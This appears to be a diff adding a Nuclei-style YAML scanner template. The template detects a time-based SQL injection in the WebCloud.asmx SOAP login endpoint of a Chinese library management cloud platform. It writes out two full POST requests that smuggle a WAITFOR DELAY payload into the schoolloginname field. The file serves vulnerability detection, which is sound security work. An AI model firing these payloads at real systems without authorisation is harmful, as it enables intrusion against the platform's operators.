@@ -1,0 +1,81 @@
+id: poc-yaml-cnedustar-webcloud-sqli
+info:
+  name: 科讯图书馆综合管理云平台WebCloud.asmx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects SQL injection vulnerabilities in the WebCloud.asmx endpoint of the 科讯图书馆综合管理云平台.
+
+variables:
+  t1: '{{rand_int(5, 9)}}'
+  t2: '{{to_number(t1) + 2}}'
+  t3: '{{rand_int(1, 4)}}'
+  t4: '{{to_number(t3) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /WebCloud.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "\"WebCloud/LibraryCloud\""
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <LibraryCloud xmlns="WebCloud">
+        <str>{"cmd":"login","schoolloginname":"1';WAITFOR DELAY '0:0:{{t1}}'--","schoolpwd":"1"}</str>
+        <files>base64Binary</files>
+        </LibraryCloud>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
+      - type: word
+        part: body
+        words:
+          - "<LibraryCloudResult>"
+          - "<LibraryCloudResponse>"
+          - "\"WebCloud\""
+
+  - raw:
+      - |
+        POST /WebCloud.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "\"WebCloud/LibraryCloud\""
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <LibraryCloud xmlns="WebCloud">
+        <str>{"cmd":"login","schoolloginname":"1';WAITFOR DELAY '0:0:{{t3}}'--","schoolpwd":"1"}</str>
+        <files>base64Binary</files>
+        </LibraryCloud>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t3)"
+          - "duration <= to_number(t4)"
+      - type: word
+        part: body
+        words:
+          - "<LibraryCloudResult>"
+          - "<LibraryCloudResponse>"
+          - "\"WebCloud\""
